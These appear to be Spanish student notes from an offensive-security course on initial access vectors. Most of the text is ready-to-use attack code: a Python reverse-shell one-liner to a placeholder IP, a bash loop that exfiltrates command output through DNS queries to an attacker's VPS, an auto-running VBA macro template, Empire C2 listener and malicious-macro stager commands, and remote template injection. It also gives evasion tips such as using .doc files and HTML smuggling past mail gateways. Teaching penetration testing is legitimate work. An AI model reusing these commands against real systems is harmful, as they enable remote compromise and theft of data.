# 3. Vectores de acceso
## D1n0 - Alejandro Maman INSO3A U-TAD

### Principales vectores
- Perimetro (vulnerabilidades web, RCE, SQLi, File Upload, XXE, deserialización)
- Fuerza bruta en anchura contra empleados (VPN, Citrix, OWA)
- XSS en aplicaciones relevantes (robo de sesiones)
- Malware (macros, HTA, vulnerabilidades puntuales)
- Wi-Fi
- Físico (implante hardware)

### Conexiones inversas interactivas
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<puerto>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
python -c 'import pty; pty.spawn("/bin/bash")'
```
Referencia: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

### Exfiltración mediante DNS
Para situaciones donde no hay salida directa a Internet y no se puede desplegar reGeorg:
```bash
<comando> | xxd -ps -c 200 | tr -d '\n' > out.txt
i=$(wc -c out.txt | cut -d " " -f1)
for ((j=0;$i>=0;j++));
do x=$(tail -c $i out.txt);
y=$(echo $x | head -c 60);
dig @<VPS> -p 5053 +short -x $y.<dominio>;
i=$(expr $i - 60); done;
```
Servidor DNS para captura: https://gist.github.com/andreif/6069838

### Macros VBA
```vba
Sub AutoOpen()
Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "notepad"  ' placeholder — sustituir por el comando/payload real
End Sub
```
Usar extensión `.doc` en vez de `.docx` o `.docm`.

### Empire Framework
```bash
# Arrancar
sudo powershell-empire server
sudo powershell-empire client

# Listener
Empire> uselistener http
Empire> set Port <puerto>
Empire> execute

# Macro maliciosa
Empire> usestager multi_macros
Empire> set Listener http
Empire> execute
```

### Remote Template Injection
```bash
python remoteinjector.py -w <URL .dotm malicioso> <archivo.docx>
```

### HTML Smuggling
Técnica que usa JavaScript para reconstruir la dirección web del payload. El navegador descarga el archivo directamente, evitando que los gateways analicen el enlace.

---
